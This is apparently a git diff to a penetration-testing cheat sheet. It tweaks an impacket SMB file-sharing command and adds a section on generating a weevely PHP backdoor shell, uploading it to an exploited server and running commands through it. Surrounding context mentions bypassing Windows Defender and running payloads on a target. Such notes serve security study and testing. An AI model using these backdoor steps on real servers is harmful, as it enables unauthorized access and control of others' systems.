@@ -16,7 +16,7 @@ fg
 ### Sharing files with Windows machine
 **NOTE:** This technique is usefull also to share files with any Windows VM *(or the parent host)* 
 ```bash
-impacket-smbserver share <path> -smb2support
+impacket-smbserver share [path] -smb2support
 ```
 ## PrivEsc on Windows
 ### Bypassing Windows Defender
@@ -37,4 +37,18 @@ There're a [usefull scripts](https://astr0baby.wordpress.com/2019/01/26/custom-m
 # Define the LHOST
 # Define the LPORT
 # Now the payload shall be ran into the target
+```
 
+## WebApplication Hacking
+### Create a PHP Backdoor shell
+The software named **weevely** will help on this matter. It's a software that crates the php file to upload to the exploited
+server.
+
+```bash
+# Generate new agent
+weevely generate <password> <path>
+# Run terminal or command on the target
+weevely <URL> <password> [cmd]
+# Recover an existing session
+weevely session <path> [cmd]
+```
